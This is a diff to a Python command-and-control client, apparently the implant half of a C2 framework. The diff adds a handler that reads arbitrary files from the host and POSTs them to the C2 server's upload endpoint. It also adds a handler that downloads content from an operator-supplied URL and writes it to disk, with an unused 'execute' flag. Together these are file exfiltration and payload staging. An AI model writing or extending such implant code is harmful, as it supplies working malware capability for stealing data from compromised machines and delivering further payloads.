@@ -67,10 +67,14 @@ class C2Client:
                     self.handle_cmd_operation(resource)
                 case "IMP":
                     self.handle_imp_operation(resource)
-                case "FUP":
-                    self.handle_fup_operation(resource)
                 case "FDL":
-                    self.handle_fdl_operation(resource)
+                    key = op.get("fdl_key")
+                    self.handle_fdl_operation(resource, key)
+                case "FUP":
+                    target_dir = op.get("target_dir")
+                    execute = op.get("execute")
+                    
+                    self.handle_fup_operation(resource, target_dir, execute)
 
     def handle_cmd_operation(self, command):
         cmd_out = ""
@@ -95,11 +99,36 @@ class C2Client:
             
         self.report(status, cmd_out)
     
-    def handle_fup_operation(self, file_path):
-        pass
+    def handle_fdl_operation(self, file_path, key):
+        try:         
+            if not os.path.exists(file_path):
+                print("Target path not found...")
+            else:
+                url = f"{self.server_url}/upload"
+                with open(file_path, "rb") as f:
+                    print("CLIENT-OTK: " + key)
+                    payload = {
+                        "status": "SUCCESS",
+                        "client_id": self.client_id,
+                        "file_name": file_path.split("\\")[-1],
+                        "fdl_key": key
+                    }
+                    
+                    requests.post(url, data=payload, files={"file": f})
+                
+                print("[+] Successfully sent file.")
+        except Exception as e:
+            print(str(e))
     
-    def handle_fdl_operation(self, file_path):
-        pass
+    def handle_fup_operation(self, resource, target_dir, execute):
+        try:
+            response = requests.get(resource)
+            with open(target_dir, "wb") as f:
+                f.write(response.content)
+                
+            print(f"Downloaded {resource} successfully.")
+        except Exception as e:
+            print(f"Error downloading {resource} on client.")
 
 if __name__ == "__main__":
     client = C2Client("http://localhost:9393")
